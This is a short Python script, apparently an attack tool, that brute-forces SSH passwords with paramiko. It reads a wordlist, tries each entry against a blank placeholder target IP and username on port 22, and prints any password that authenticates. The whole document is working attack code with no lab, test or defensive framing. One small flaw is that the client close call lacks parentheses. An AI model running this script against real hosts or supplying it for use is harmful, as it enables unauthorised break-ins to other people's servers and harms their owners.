import paramiko, sys, os

target_IP = "" #Place Target IP
username = "" #Target Machine User
password_file = "" #Dictionary file

def ssh_connect(password, code=0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target_IP,port=22, username=username, password=password,timeout=1)

    except paramiko.AuthenticationException:
        code=1
    client.close
    return code

client = paramiko.SSHClient()
with open(password_file,'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            resp = ssh_connect(password)
            if resp == 0:
                print(f"Found: {password}")
                exit(0)
            elif resp == 1:
                print("Nothing found")
        except Exception as e:
            print(e)
        pass
